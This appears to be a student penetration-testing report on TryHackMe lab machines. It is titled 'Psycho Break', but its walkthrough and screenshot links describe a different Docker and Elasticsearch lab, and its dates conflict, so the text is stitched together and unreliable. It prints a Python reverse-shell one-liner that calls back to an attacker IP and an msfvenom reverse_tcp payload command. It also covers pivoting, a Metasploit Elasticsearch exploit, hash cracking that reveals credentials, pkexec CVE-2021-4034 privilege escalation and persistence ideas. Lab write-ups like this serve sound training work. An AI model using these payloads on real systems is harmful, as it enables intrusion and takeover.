# Projekt4 - webapplications pentesting

The main goal of the project was to solve machines in TryHackMe portal

The machines was:

[1. Psycho Break](https://tryhackme.com/room/psychobreak)

[2. Mustacchio](https://tryhackme.com/room/mustacchio)

[3. Overpass](https://tryhackme.com/room/overpass)

[4. 0Day](https://tryhackme.com/room/0day)


## Pentesting machine Psycho Break

### Date: 06.05.2023 - 07.05.2023
### Location
Somewhere in Poland
### Auditors
Przemysław Stachurski
### Version
1.0

### Executive summary

#### Scope and assumptions

This document is a summary of work proceeded by Group od SDA. The main subject of the tests were to obtain root privileges. The test focuses on security issues leading to compromise victim's machine.
The machine exists as a virtual machine, which can be accessed from [this link](https://tryhackme.com/room/psychobreak)
The tests were carried out by using whitebox.

#### Most severe vulnerabilites idenifies

[CVE-2021-4034](https://nvd.nist.gov/vuln/detail/CVE-2021-4034)
NIST: NVD
Base Score: 7.8 HIGH
Vector: CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H

A local privilege escalation vulnerability was found on polkit's pkexec utility. The pkexec application is a setuid tool designed to allow unprivileged users to run commands as privileged users according predefined policies. The current version of pkexec doesn't handle the calling parameters count correctly and ends trying to execute environment variables as commands. An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code. When successfully executed the attack can cause a local privilege escalation given unprivileged users administrative rights on the target machine.

### Risk classification

Vulnerabilities are classified in a five-point scale reflecting both the probability of exploitation of the
vulnerability and the business risk of its exploitation. Below is a short description of meaning of each
of severity levels.

- CRITICAL - exploitation of the vulnerability makes it possible to compromise the server
    or network device or makes it possible to access (in read and/or write mode) to data with
    a high degree of confidentiality and significance. The exploitation is usually
    straightforward, i.e. the attacker need not gain access to systems that are difficult to
    achieve and need not perform any kind of social engineering. Vulnerabilities marked
    CRITICAL must be fixed without delay, especially if they occur in production environment.
- HIGH - exploitation of the vulnerability makes it possible to access sensitive data (similar
    to CRITICAL level), however the prerequisites for the attack (e.g. possession of a user
    account in an internal system) makes it slightly less likely. Alternatively: the vulnerability
    is easy to exploit but the effects are somehow limited.
- MEDIUM - exploitation of the vulnerability might depend on external factors (e.g.
    convincing the user to click on a hyperlink) or other conditions that are difficult to achieve.
    Furthermore, exploitation of the vulnerability usually allows access only to a limited set of
    data or to data of a lesser degree of significance.
- LOW - the exploitation of the vulnerability results in little direct impact on the security of
    the application or depends on conditions that are very difficult to achieve practically (e.g.
    physical access to the server).
- INFO - issues marked as INFO are not security vulnerabilities per se. They aim to point
    out good practices, whose implementation will result in increase of general security level
    of the system. Alternatively: the issues point out some solutions in the system (e.g. from
    an architectural perspective) that might limit the negative effects of other vulnerabilities.

### Change history

2023-03-26 version 1.0 Final version of the report after carried tests out.

### Process of exploiting machine

#### Summary

During the process some technics were used to get finnaly root privileges. Despite docker technology was used, root privileges has been gain as a result of misconfiguration, poorly password protection and use of documented vulnerability. Methods and technics were used:
-port scanning
-webapp attacks
-code injection
-pivoting
-exploitation
-password cracking
-brute forcing

#### Prerequisites for the attack

Local internet access - Victim's IP Address: 10.10.137.177

#### Technical details (Proof of concept)

1.  First of all we needed to discover services at victim's machine

![](https://github.com/stachu79/projekt4/blob/main/rustscan1.png)

2.  Detailed scan showed services on machine.
```
Nmap 7.93 scan initiated Sat May  6 03:53:57 2023 as: nmap -A -sC -sV -sS -oA /home/kali/Pulpit/THM/psychobreak/nmap -vvv -p 22,21,80 10.10.137.177
Nmap scan report for 10.10.137.177
Host is up, received echo-reply ttl 63 (0.091s latency).
Scanned at 2023-05-06 03:53:58 EDT for 15s

PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 ProFTPD 1.3.5a
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu))
```
![](https://github.com/stachu79/projekt4/blob/main/rustscan2.png)


3.  We so, that http service is running on machine. We opened the page.
    Default page:

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/02.start_page_5000.png)

Nothing to see here. Next step was to enumerate subpage. With the help of gobuster tool we started to uncover dirs.
3\. At very begining we discovered `/admin`.

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/04.admin_page_5000.png)

This page gave us an access to insert code and achive first door - root on machine created in docker container idetified as a `HOSTNAME=aa8dfbb06e85`and ip address 172.17.0.3.
4\. Python reverse shell to inject on /admin page:

```
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.10.108",8002));os.dup2(s.filen
o(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/05.got_reverse_shell_8002.png)

5.  Let's discover the environment:
    user identification:

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/06a.identification.png)

system identification:

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/06b.identification_env.png)

network identification:

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/07.network_identification.png)

docker:

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/08.cat_dockerfile.png)

docker process:

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/09.ps_aux.png)

docker process detailed:

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/10.cat_proc_1_cgroup.png)

6.  Having root privileges we were able to scan inner network: 172.17.0.0. Download binaries of nmap and run scanning:

```
wget https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/nmap
Connecting to github.com (140.82.121.3:443)
ssl_client: write: Broken pipe
Connecting to raw.githubusercontent.com (185.199.109.133:443)
nmap                 100% |*******************************|  5805k  0:00:00 ETA

/root # chmod 755 nmap 
/root # ./nmap 172.17.0.0/24

Nmap scan report for 172.17.0.1
Cannot find nmap-mac-prefixes: Ethernet vendor correlation will not be performed                                    
Host is up (0.000067s latency).
Not shown: 1288 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
MAC Address: 02:42:6B:50:1B:D7 (Unknown) 

Nmap scan report for 172.17.0.2
Host is up (0.000046s latency).
Not shown: 1288 closed ports
PORT     STATE SERVICE
9200/tcp open  wap-wsp

Nmap scan report for 433f08b3daef (172.17.0.3)
Host is up (0.000058s latency).
All 1289 scanned ports on 433f08b3daef (172.17.0.3) are closed

Nmap done: 256 IP addresses (3 hosts up) scanned in 261.02 seconds
```

Port 9200 is by default used for service elastic search: [more info here](https://book.hacktricks.xyz/network-services-pentesting/9200-pentesting-elasticsearch)
Access to elasticsearch service is only in subnet 172.17.0.x, test from machine 172.17.0.3 confirmed that.

```
wget 172.17.0.2:9200
```

we got index.html containing some html code:

```
{
  "status" : 200,
  "name" : "Peggy Carter",
  "cluster_name" : "elasticsearch",
  "version" : {
    "number" : "1.4.2",
    "build_hash" : "927caff6f05403e936c20bf4529f144f0c89fd8c",
    "build_timestamp" : "2014-12-16T14:11:12Z",
    "build_snapshot" : false,
    "lucene_version" : "4.10.2"
  },
  "tagline" : "You Know, for Search
```

7.  Using metasploit we were able to get access to the second machine / second docker in following steps:

- create payload: python reverse shell

```
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=192.168.10.104 LPORT=4444 -o x.py
```

and upload on victim's machine (using python http server)

- run metasploit `msfconsole -q`
    following the command:
    using module: exploit/multi/handler
    and options:
    ![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/11.show_options_multi_handler.png)
    and executing payload on victim's machine we created first session

```
[*] Meterpreter session 1 opened (192.168.10.104:4444 -> 192.168.10.108:48941) at 2023-03-26 15:33:18 +0200
```

To be able to have access to elasticsearch service on attacer's machine we configured port forwarding

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/12.portforwarding.png)

- the next step is use elasticsearch exploit to get shell. We used exploit/multi/elasticsearch/search\_groovy\_script options:

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/13.show_options_groovy.png)

and we obtainde second session:

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/14.output_session2_created.png)

We gained access to next machine, below is the identification:

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/15.sysinfo.png)

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/17_docker2_identification.png.png)

8.  Looking through the files, we found passwords file with some users and hashes. After a while, we got passwords with help of hashcat.

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/18_hashcat_passwords.png)

We discovered, that credentials john/1337hack gave us a direct access to machine. The last stage is to gain root privileges. We achived this in to steps:
In metasploit create another session, using obtained credentials:

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/19_show_options_ssh_login.png)

we got another session:

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/20_sessions_login_ssh.png)

On base of this session, using known vulnerability (cve-2021-4034) and module in metaspolit we created final session with root privileges:

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/21_show_options_root_session.png)

Be patient! Session creation can last few minutes

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/22_connect_session_5.png)

Finally we got root with full rights. To make presistence, we have several posibilities: crerate another user with root privileges, crack the user's password (hash), exchange hash and so on.

![](https://github.com/farixus/projekt3/blob/main/screenshots_Social_Network/23_root_identification.png)

#### Recommendation

- eliminate possibility to inject code on `/admin` page
- consider to restrict code execution of some tools
- eliminate possibility of use vulnerability described as [CVE-2021-4034](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-4034)
- try no to hold passwords and/or hashes written in a files within filesystem (inside docker) and accessible to everybody.



